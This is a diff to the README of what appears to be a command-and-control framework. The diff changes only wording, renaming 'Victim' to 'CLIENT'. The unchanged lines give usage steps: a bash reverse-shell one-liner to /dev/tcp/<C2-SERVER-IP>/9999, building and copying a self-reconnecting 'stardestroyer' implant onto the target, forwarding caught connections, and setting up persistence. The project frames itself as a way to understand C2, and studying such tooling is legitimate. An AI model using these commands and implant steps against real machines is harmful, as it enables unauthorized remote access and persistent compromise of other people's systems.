@@ -22,7 +22,7 @@ Build and understand C2 infrastructure.
     - `python3 deathstar-web.py`
 2. Open link in web browser
     - `firefox 127.0.0.1:5000`
-3. Have Victim connect to C2
+3. Have CLIENT connect to C2
     - Linux / MacOS
       - BASH
           - `bash -c "bash -i >& /dev/tcp/<C2-SERVER-IP>/9999 0>&1"`
@@ -30,7 +30,7 @@ Build and understand C2 infrastructure.
           - This will continue to connect to the C2 server even after it 'drops'
           - Modify the 'SERVER_IP = ' in `stardestroyer.py`   
           - `bash converter.sh stardestroyer.py`
-          - Copy `stardestoryer` to VICTIM
+          - Copy `stardestoryer` to CLIENT
           - `chmod +x stardestroyer`
           - `./stardestroyer`
     - Windows
@@ -55,7 +55,7 @@ Build and understand C2 infrastructure.
 # CLI C2 server
 1. Start the server
     - `python3 deathstar-term.py`
-2. Have Victim connect to C2
+2. Have CLIENT connect to C2
     - Linux / MacOS
       - BASH
           - `bash -c "bash -i >& /dev/tcp/<C2-SERVER-IP>/9999 0>&1"`
@@ -63,7 +63,7 @@ Build and understand C2 infrastructure.
           - This will continue to connect to the C2 server even after it 'drops'
           - Modify the 'SERVER_IP = ' in `stardestroyer.py`   
           - `bash converter.sh stardestroyer.py`
-          - Copy `stardestoryer` to VICTIM
+          - Copy `stardestoryer` to CLIENT
           - `chmod +x stardestroyer`
           - `./stardestroyer`
     - Windows
@@ -82,7 +82,7 @@ Build and understand C2 infrastructure.
 4. Forward the connection to your listener
     - On the CLI, list the connections.
       - Select `2)` to forward.
-      - Specify the `ID` of the `VICTIM` you'd like to forward.
+      - Specify the `ID` of the `CLIENT` you'd like to forward.
       - Then, type the IP of your `LISTENING` device.
 5.Catch the connection
     - Once you've caught the connection, begin setting up persistence.
